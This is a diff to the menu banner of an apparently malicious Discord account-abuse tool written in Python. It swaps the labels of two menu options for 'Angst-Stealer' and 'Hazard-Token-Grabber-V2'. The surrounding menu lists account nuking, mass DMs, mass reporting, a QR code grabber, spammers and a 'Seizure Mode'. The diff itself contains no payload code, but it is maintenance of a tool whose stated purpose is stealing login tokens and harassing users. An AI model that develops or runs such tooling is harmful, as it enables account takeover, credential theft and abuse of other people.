@@ -574,8 +574,8 @@ def banner(theme=None):
 {Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
 {Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Nuke Account                                |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.LIGHTBLACK_EX} Block Friends
 {Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Unfriend all friends                        |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.LIGHTBLACK_EX} Profile Changer
-{Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} [Coming Soon] 
-{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} Create Token Grabber 
+{Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.LIGHTBLACK_EX} Angst-Stealer 
+{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.LIGHTBLACK_EX} Hazard-Token-Grabber-V2
 {Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.LIGHTBLACK_EX} QR Code grabber
 {Fore.RESET}[{Fore.GREEN}6{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Dm                                     |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.LIGHTBLACK_EX} Mass Report
 {Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode                         |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.LIGHTBLACK_EX} GroupChat Spammer
@@ -599,8 +599,8 @@ def bannerTheme(type1, type2):
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 [1] Nuke Account                                |[10] Block Friends
 [2] Unfriend all friends                        |[11] Profile Changer
-[3] Delete and leave all servers                |[12] [Coming Soon]
-[4] Spam Create New servers                     |[13] Create Token Grabber 
+[3] Delete and leave all servers                |[12] Angst-Stealer
+[4] Spam Create New servers                     |[13] Hazard-Token-Grabber-V2
 [5] Dm Deleter                                  |[14] QR Code grabber
 [6] Mass Dm                                     |[15] Mass Report
 [7] Enable Seizure Mode                         |[16] GroupChat Spammer
